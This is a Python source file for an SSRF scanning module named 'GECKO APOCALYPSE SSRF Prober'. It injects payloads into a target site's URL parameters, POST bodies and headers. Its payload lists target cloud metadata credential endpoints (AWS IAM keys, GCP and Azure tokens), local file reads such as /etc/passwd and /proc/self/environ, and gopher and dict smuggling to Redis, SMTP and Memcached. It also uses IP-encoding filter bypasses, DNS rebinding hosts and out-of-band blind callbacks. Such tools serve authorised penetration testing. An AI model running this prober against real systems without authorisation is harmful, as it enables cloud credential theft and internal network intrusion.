"""GECKO APOCALYPSE - SSRF Prober v2.0 (Cloud metadata, internal recon, protocol smuggling, DNS rebinding, blind SSRF)"""

import asyncio
import base64
import hashlib
import ipaddress
import random
import re
import socket
import string
import time
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, quote, unquote, urlencode, urlparse

import aiohttp


class SSRFProber:
    """
    Advanced Server-Side Request Forgery detection module.
    Tests for cloud metadata access, internal network reconnaissance,
    protocol smuggling, DNS rebinding, and blind SSRF via OOB callbacks.
    """

    CVSS_BASE = {
        "CRITICAL": {
            "score": 9.8,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        },
        "HIGH": {
            "score": 8.1,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        },
        "MEDIUM": {
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        },
        "LOW": {"score": 3.7, "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"},
    }

    CWE_MAP = {
        "metadata": "CWE-918",
        "protocol": "CWE-918",
        "internal": "CWE-918",
        "blind": "CWE-918",
        "rebinder": "CWE-918",
        "file_read": "CWE-22",
    }

    OWASP_MAP = "A10:2021 - Server-Side Request Forgery (SSRF)"

    # === CLOUD METADATA TARGETS ===
    CLOUD_TARGETS = [
        # AWS
        (
            "http://169.254.169.254/latest/meta-data/",
            "AWS",
            ["ami-id", "instance-id", "hostname", "local-ipv4"],
        ),
        (
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "AWS-IAM",
            ["AccessKeyId", "SecretAccessKey", "Token"],
        ),
        (
            "http://169.254.169.254/latest/user-data",
            "AWS-UserData",
            ["#!/bin", "<script", "Content-Type"],
        ),
        (
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "AWS-Identity",
            ["accountId", "region", "instanceId"],
        ),
        # GCP
        (
            "http://metadata.google.internal/computeMetadata/v1/",
            "GCP",
            ["access_token", "email", "project-id"],
        ),
        (
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "GCP-Token",
            ["access_token", "token_type"],
        ),
        (
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "GCP-Project",
            ["project-id"],
        ),
        # Azure
        (
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "Azure",
            ["compute", "access_token", "subscriptionId"],
        ),
        (
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "Azure-Token",
            ["access_token", "token_type"],
        ),
        (
            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
            "Azure-Network",
            ["interface", "ipv4", "subnet"],
        ),
        # Alibaba
        (
            "http://100.100.100.200/latest/meta-data/",
            "Alibaba",
            ["instance-id", "region-id"],
        ),
        (
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            "Alibaba-RAM",
            ["AccessKeyId", "AccessKeySecret"],
        ),
        # DigitalOcean
        (
            "http://169.254.169.254/metadata/v1.json",
            "DO",
            ["droplet_id", "region", "interfaces"],
        ),
        # Oracle
        (
            "http://169.254.169.254/opc/v1/instance/",
            "Oracle",
            ["id", "region", "compartmentId"],
        ),
        # OpenStack
        (
            "http://169.254.169.254/openstack/latest/meta_data.json",
            "OpenStack",
            ["uuid", "hostname", "project_id"],
        ),
        # Kubernetes
        (
            "https://kubernetes.default.svc/api/v1/namespaces",
            "K8s",
            ["NamespaceList", "items"],
        ),
        (
            "https://kubernetes.default.svc/api/v1/pods",
            "K8s-Pods",
            ["PodList", "items"],
        ),
    ]

    # === INTERNAL NETWORK TARGETS ===
    INTERNAL_TARGETS = [
        "http://127.0.0.1:22/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:5432/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:27017/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:3000/",
        "http://127.0.0.1:5000/",
        "http://127.0.0.1:8000/",
        "http://127.0.0.1:8443/",
        "http://127.0.0.1:9000/",
        "http://127.0.0.1:9090/",
        "http://localhost:8080/actuator/health",
        "http://localhost:8080/api/health",
        "http://localhost:3000/api/v1/users",
        "http://localhost:8000/admin",
    ]

    # === BYPASS TECHNIQUES ===
    BYPASS_ENCODINGS = [
        lambda u: u.replace("127.0.0.1", "0177.0.0.1"),
        lambda u: u.replace("127.0.0.1", "0x7f.0x00.0x00.0x01"),
        lambda u: u.replace("127.0.0.1", "2130706433"),
        lambda u: u.replace("127.0.0.1", "0x7f000001"),
        lambda u: u.replace("169.254.169.254", "0251.254.169.254"),
        lambda u: u.replace("169.254.169.254", "2852039166"),
        lambda u: u.replace("169.254.169.254", "0xa9fea9fe"),
        lambda u: u.replace("http://", "http://0.0.0.0/"),
        lambda u: u.replace("169.254.169.254", "[::ffff:169.254.169.254]"),
        lambda u: u.replace("127.0.0.1", "[::ffff:127.0.0.1]"),
        lambda u: u.replace("http://", "http://@"),
        lambda u: u.replace("http://", "http://%09"),
        lambda u: u.replace("http://", "http://%20"),
        lambda u: u.replace("169.254.169.254", "169.254.169.254.xip.io"),
    ]

    # === PROTOCOL SMUGGLING ===
    PROTOCOL_PAYLOADS = [
        ("file:///etc/passwd", "FileRead-Linux", ["root:x:0:0", "daemon:x:1:1"]),
        ("file:///c:/windows/win.ini", "FileRead-Windows", ["[extensions]", "[fonts]"]),
        ("file:///etc/hosts", "FileRead-Hosts", ["127.0.0.1", "localhost"]),
        ("file:///proc/self/environ", "FileRead-Environ", ["PATH=", "USER=", "HOME="]),
        ("dict://127.0.0.1:11211/stat", "Memcached", ["STAT pid", "STAT uptime"]),
        ("gopher://127.0.0.1:25/_HELO%20localhost", "SMTP", ["220", "250"]),
        ("gopher://127.0.0.1:6379/_INFO", "Redis", ["redis_version", "used_memory"]),
        ("gopher://127.0.0.1:9200/_GET%20/", "Elastic", ["cluster_name", "tagline"]),
        ("ldap://127.0.0.1:389/", "LDAP", ["supportedLDAPVersion", "namingContexts"]),
        ("ftp://anonymous:anonymous@127.0.0.1:21/", "FTP", ["220", "230"]),
        ("tftp://127.0.0.1:69/test", "TFTP", ["\x00\x03", "\x00\x04"]),
    ]

    # === DNS REBINDING ===
    DNS_REBINDERS = [
        "http://1u.ms/",
        "http://nip.io/",
        "http://xip.io/",
        "http://rbndr.us/",
    ]

    # === PARAMETER NAMES FOR URL-BASED SSRF ===
    URL_PARAMS = [
        "url",
        "uri",
        "path",
        "dest",
        "destination",
        "redirect",
        "link",
        "src",
        "source",
        "callback",
        "return",
        "return_to",
        "next",
        "goto",
        "page",
        "site",
        "target",
        "file",
        "folder",
        "dir",
        "document",
        "resource",
        "endpoint",
        "host",
        "ip",
        "proxy",
        "feed",
        "import",
        "include",
        "require",
        "load",
        "fetch",
        "request",
        "reference",
        "location",
        "continue",
        "forward",
        "out",
        "to",
        "from",
    ]

    def __init__(self, session, config, db, oob_callback: Optional[str] = None):
        self.session = session
        self.config = config
        self.db = db
        self.oob_callback = oob_callback
        self.findings: List[Dict] = []
        self._fingerprint_cache: Dict[str, str] = {}
        self._blind_markers: Dict[str, str] = {}

    def _generate_blind_marker(self) -> str:
        """Generate unique marker for blind SSRF detection."""
        marker = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
        self._blind_markers[marker] = time.time()
        return marker

    def _get_severity(self, target_type: str) -> str:
        if target_type.startswith(("AWS", "GCP", "Azure", "Alibaba", "Oracle", "K8s")):
            return "CRITICAL"
        if target_type in (
            "FileRead-Linux",
            "FileRead-Windows",
            "FileRead-Hosts",
            "FileRead-Environ",
        ):
            return "HIGH"
        if target_type in ("SMTP", "Redis", "Memcached", "LDAP", "FTP"):
            return "HIGH"
        if "Token" in target_type or "IAM" in target_type or "RAM" in target_type:
            return "CRITICAL"
        return "MEDIUM"

    def _build_finding(
        self,
        url: str,
        param: Optional[str],
        payload: str,
        target_type: str,
        evidence: str,
        bypass: str = "direct",
    ) -> Dict:
        sev = self._get_severity(target_type)
        return {
            "module": "SSRFProber",
            "type": f"Server-Side Request Forgery ({target_type})",
            "severity": sev,
            "cvss_score": self.CVSS_BASE[sev]["score"],
            "cvss_vector": self.CVSS_BASE[sev]["vector"],
            "cwe": self.CWE_MAP.get(
                (
                    "metadata"
                    if "169.254" in payload or "metadata" in payload
                    else "protocol" if "://" in payload else "internal"
                ),
                "CWE-918",
            ),
            "owasp": self.OWASP_MAP,
            "url": url,
            "parameter": param,
            "payload": payload,
            "bypass_technique": bypass,
            "evidence": evidence[:500],
            "remediation": "Validate and sanitize all URLs, whitelist allowed destinations, block internal IP ranges, implement URL parsers that resolve before request, disable unnecessary URL schemes.",
            "timestamp": time.time(),
        }

    async def scan(self, url: str, content: str, headers: Dict, response) -> List[Dict]:
        self.findings = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # 1. Discover URL parameters
        params = self._discover_params(url, content)

        # 2. Test cloud metadata via discovered params
        await self._test_cloud_metadata(url, params)

        # 3. Test internal network access
        await self._test_internal_network(url, params)

        # 4. Test protocol smuggling
        await self._test_protocol_smuggling(url, params)

        # 5. Test bypass encodings
        await self._test_bypass_encodings(url, params)

        # 6. Test DNS rebinding
        await self._test_dns_rebinding(url, params)

        # 7. Test blind SSRF if OOB callback configured
        if self.oob_callback:
            await self._test_blind_ssrf(url, params)

        # 8. Test POST body SSRF
        await self._test_post_body_ssrf(url, content)

        # 9. Test header-based SSRF
        await self._test_header_ssrf(url)

        return self.findings

    def _discover_params(self, url: str, content: str) -> List[str]:
        """Discover URL parameters that might accept URLs."""
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        # Also check POST forms and JSON in content
        found = [p for p in params if any(k in p.lower() for k in self.URL_PARAMS)]
        # Check for URL params in forms
        form_params = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', content)
        found += [
            p for p in form_params if any(k in p.lower() for k in self.URL_PARAMS)
        ]
        return list(set(found))

    async def _test_cloud_metadata(self, url: str, params: List[str]):
        """Test for cloud metadata access via SSRF."""
        for param in params:
            for target, cloud_type, indicators in self.CLOUD_TARGETS:
                parsed = urlparse(url)
                qs = parse_qs(parsed.query)
                qs[param] = [target]
                test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()

                try:
                    req_headers = {}
                    if "google" in target:
                        req_headers["Metadata-Flavor"] = "Google"
                    if "azure" in target.lower():
                        req_headers["Metadata"] = "true"

                    async with self.session.get(
                        test_url,
                        headers=req_headers,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=False,
                    ) as r:
                        text = await r.text(errors="ignore")
                        if any(ind in text for ind in indicators):
                            self.findings.append(
                                self._build_finding(
                                    url,
                                    param,
                                    target,
                                    cloud_type,
                                    f"Cloud metadata accessed. Response: {text[:300]}",
                                    "direct",
                                )
                            )
                            break
                except Exception:
                    continue

    async def _test_internal_network(self, url: str, params: List[str]):
        """Test for internal network access."""
        for param in params:
            for target in self.INTERNAL_TARGETS:
                parsed = urlparse(url)
                qs = parse_qs(parsed.query)
                qs[param] = [target]
                test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()

                try:
                    start = time.time()
                    async with self.session.get(
                        test_url,
                        timeout=aiohttp.ClientTimeout(total=8),
                        allow_redirects=False,
                    ) as r:
                        elapsed = time.time() - start
                        text = await r.text(errors="ignore")

                        # Detect open ports by response characteristics
                        if r.status != 404 and r.status != 400 and len(text) > 50:
                            if any(
                                k in text.lower()
                                for k in [
                                    "ssh",
                                    "mysql",
                                    "redis",
                                    "nginx",
                                    "apache",
                                    "tomcat",
                                ]
                            ):
                                self.findings.append(
                                    self._build_finding(
                                        url,
                                        param,
                                        target,
                                        "Internal-Recon",
                                        f"Internal service fingerprinted. Status: {r.status}, Length: {len(text)}, Time: {elapsed:.2f}s",
                                        "direct",
                                    )
                                )
                                break
                except asyncio.TimeoutError:
                    # Timeout might indicate filtered port
                    pass
                except Exception:
                    continue

    async def _test_protocol_smuggling(self, url: str, params: List[str]):
        """Test for protocol smuggling via alternative schemes."""
        for param in params:
            for payload, proto_type, indicators in self.PROTOCOL_PAYLOADS:
                parsed = urlparse(url)
                qs = parse_qs(parsed.query)
                qs[param] = [payload]
                test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()

                try:
                    async with self.session.get(
                        test_url,
                        timeout=aiohttp.ClientTimeout(total=12),
                        allow_redirects=False,
                    ) as r:
                        text = await r.text(errors="ignore")
                        if any(ind in text for ind in indicators):
                            self.findings.append(
                                self._build_finding(
                                    url,
                                    param,
                                    payload,
                                    proto_type,
                                    f"Protocol smuggling successful. Response: {text[:300]}",
                                    "protocol-smuggling",
                                )
                            )
                            break
                except Exception:
                    continue

    async def _test_bypass_encodings(self, url: str, params: List[str]):
        """Test various IP encoding bypasses."""
        base_targets = [
            "http://127.0.0.1:80/",
            "http://169.254.169.254/latest/meta-data/",
        ]

        for param in params:
            for base in base_targets:
                for encoder in self.BYPASS_ENCODINGS:
                    bypass_target = encoder(base)
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query)
                    qs[param] = [bypass_target]
                    test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()

                    try:
                        async with self.session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=10),
                            allow_redirects=False,
                        ) as r:
                            text = await r.text(errors="ignore")
                            if (
                                "ami-id" in text
                                or "instance-id" in text
                                or "root:x:0:0" in text
                            ):
                                self.findings.append(
                                    self._build_finding(
                                        url,
                                        param,
                                        bypass_target,
                                        "Bypass-Encoding",
                                        f"Encoding bypass worked. Response: {text[:300]}",
                                        (
                                            encoder.__name__
                                            if hasattr(encoder, "__name__")
                                            else "lambda"
                                        ),
                                    )
                                )
                                return
                    except Exception:
                        continue

    async def _test_dns_rebinding(self, url: str, params: List[str]):
        """Test DNS rebinding attacks."""
        for param in params:
            for rebinder in self.DNS_REBINDERS:
                target = f"{rebinder}169.254.169.254/latest/meta-data/"
                parsed = urlparse(url)
                qs = parse_qs(parsed.query)
                qs[param] = [target]
                test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()

                try:
                    async with self.session.get(
                        test_url,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=False,
                    ) as r:
                        text = await r.text(errors="ignore")
                        if "ami-id" in text or "instance-id" in text:
                            self.findings.append(
                                self._build_finding(
                                    url,
                                    param,
                                    target,
                                    "DNS-Rebinding",
                                    f"DNS rebinding successful. Response: {text[:300]}",
                                    "dns-rebind",
                                )
                            )
                            return
                except Exception:
                    continue

    async def _test_blind_ssrf(self, url: str, params: List[str]):
        """Test for blind SSRF via OOB callback."""
        if not self.oob_callback:
            return

        for param in params:
            marker = self._generate_blind_marker()
            target = f"{self.oob_callback}?marker={marker}"
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            qs[param] = [target]
            test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()

            try:
                async with self.session.get(
                    test_url, timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    pass  # We don't care about response for blind
            except Exception:
                pass

            # Store marker for async check later
            self.findings.append(
                {
                    "module": "SSRFProber",
                    "type": "Blind SSRF (OOB)",
                    "severity": "HIGH",
                    "cvss_score": 8.1,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    "cwe": "CWE-918",
                    "owasp": self.OWASP_MAP,
                    "url": url,
                    "parameter": param,
                    "payload": target,
                    "bypass_technique": "blind-oob",
                    "evidence": f"OOB marker: {marker}. Check callback server for DNS/HTTP hits.",
                    "remediation": "Validate all outbound URLs, implement egress filtering, monitor for DNS rebinding.",
                    "timestamp": time.time(),
                    "marker": marker,
                }
            )

    async def _test_post_body_ssrf(self, url: str, content: str):
        """Test SSRF via POST body parameters."""
        # Check for JSON body with URL fields
        json_patterns = [
            r'"(url|uri|endpoint|webhook|callback)":\s*"([^"]+)"',
            r'"(src|source|target|redirect)":\s*"([^"]+)"',
        ]
        for pattern in json_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for field, value in matches:
                if value.startswith("http"):
                    # The field already has a URL - test if we can swap it
                    test_body = content.replace(
                        value, "http://169.254.169.254/latest/meta-data/"
                    )
                    try:
                        async with self.session.post(
                            url,
                            data=test_body,
                            headers={"Content-Type": "application/json"},
                            timeout=aiohttp.ClientTimeout(total=12),
                        ) as r:
                            text = await r.text(errors="ignore")
                            if "ami-id" in text:
                                self.findings.append(
                                    self._build_finding(
                                        url,
                                        field,
                                        "http://169.254.169.254/latest/meta-data/",
                                        "POST-Body-SSRF",
                                        f"POST body SSRF. Response: {text[:300]}",
                                        "post-body",
                                    )
                                )
                    except Exception:
                        pass

    async def _test_header_ssrf(self, url: str):
        """Test SSRF via HTTP headers (Host, X-Forwarded-Host, etc)."""
        headers_to_test = {
            "X-Forwarded-Host": "169.254.169.254",
            "X-Forwarded-For": "169.254.169.254",
            "X-Real-IP": "169.254.169.254",
            "X-Originating-IP": "169.254.169.254",
            "X-Remote-IP": "169.254.169.254",
            "X-Remote-Addr": "169.254.169.254",
            "X-ProxyUser-Ip": "169.254.169.254",
            "CF-Connecting-IP": "169.254.169.254",
            "True-Client-IP": "169.254.169.254",
            "Host": "169.254.169.254",
            "Referer": "http://169.254.169.254/latest/meta-data/",
            "Origin": "http://169.254.169.254",
        }

        for header_name, header_value in headers_to_test.items():
            try:
                headers = {header_name: header_value}
                async with self.session.get(
                    url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    allow_redirects=False,
                ) as r:
                    text = await r.text(errors="ignore")
                    if (
                        "ami-id" in text
                        or "instance-id" in text
                        or "AccessKeyId" in text
                    ):
                        self.findings.append(
                            self._build_finding(
                                url,
                                f"Header:{header_name}",
                                header_value,
                                "Header-SSRF",
                                f"Header-based SSRF via {header_name}. Response: {text[:300]}",
                                "header-injection",
                            )
                        )
                        break
            except Exception:
                continue

    async def verify_blind_markers(self) -> List[Dict]:
        """Check OOB callback server for blind SSRF hits. Call after scan completes."""
        confirmed = []
        for marker, timestamp in self._blind_markers.items():
            # This would integrate with your OOB callback server API
            # For now, return pending findings
            pass
        return confirmed
